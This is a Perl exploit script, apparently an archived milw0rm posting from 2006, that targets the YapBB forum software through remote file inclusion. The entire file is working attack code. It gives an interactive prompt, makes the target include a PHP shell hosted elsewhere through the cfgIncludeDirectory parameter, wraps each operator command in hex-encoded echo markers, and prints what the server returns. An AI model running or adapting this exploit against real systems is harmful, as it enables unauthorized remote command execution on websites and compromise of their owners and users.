#!/usr/bin/perl
#
# YapBB <=1.2 Beta Remote Command Execution Exploit
#
# Copyright (c) 2006 cijfer <cijfer@netti!fi>
# All rights reserved.
#
# never ctrl+c again.
# cijfer$ http://target.com/dir
# host changed to 'http://target.com/dir'
# cijfer$ 
#
# to set your PHP shell location:
# cijfer$ shell=http://my.shell.fi/phpshell.gif?&cmd=
# php shell set to 'http://my.shell.fi/phpshell.gif?&cmd='
# cijfer$
#
# $Id: cijfer-yapbbxpl.pl,v 0.1 2006/02/15 02:37:00 cijfer Exp $

use LWP::UserAgent;
use URI::Escape;
use Getopt::Long;
use Term::ANSIColor;

$res  = GetOptions("host=s" => \$host, "proxy=s" => \$proxy, "verbose+" => \$verbose);
&usage unless $host;

while()
{
	print color("green"), "cijfer\$ ", color("reset");
	chomp($command = <STDIN>);
	exit unless $command;
	if($command =~ m/^http:\/\/(.*)/g)
	{
		$host="http://".$1;
		print "host changed to '";
		print color("bold"), $host."'\n", color("reset");
	}
	elsif($command =~ m/^shell=http:\/\/(.*)/g)
	{
		$shel="http://".$1;
		print "php shell set to '";
		print color("bold"), $shel."'\n", color("reset");
	}
	else
	{
		&exploit($command,$host);
	}
}

sub usage
{
	print "YapBB <=1.2 Beta Remote Command Execution Exploit\n";
	print "usage: $0 -hpv\n\n";
	print "  -h, --host\t\tfull address of target (ex. http://www.website.com/directory)\n";
	print "  -p, --proxy\t\tprovide an HTTP proxy (ex. 0.0.0.0:8080)\n";
	print "  -v, --verbose\t\tverbose mode (debug)\n\n";
	exit;
}

sub exploit
{
	my($command,$host) = @_;

	$cij=LWP::UserAgent->new() or die;
	$cij->agent("Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:2.0) Gecko/20060101");
	$cij->proxy("http", "http://".$proxy."/") unless !$proxy;

	$string  = "%65%63%68%6F%20%5F%63%69%6A%66%65%72%5F%3B";
	$string .= uri_escape(shift);
	$string .= "%3B%20%65%63%68%6F%20%5F%63%69%6A%66%65%72%5F";

	$out=$cij->get($host."/include/global.php?GLOBALS[includeBit]=1&cfgIncludeDirectory=".$shel.$string);

	if($out->is_success)
	{
		@cij=split("_cijfer_",$out->content);
		print substr(@cij[1],1);
	}

	if($verbose)
	{
		$recv=length $out->content;
		print "Total received bytes: ".$recv."\n";
		$sent=length $command;
		print "Total sent bytes: ".$sent."\n";
	}
}

# milw0rm.com [2006-02-16]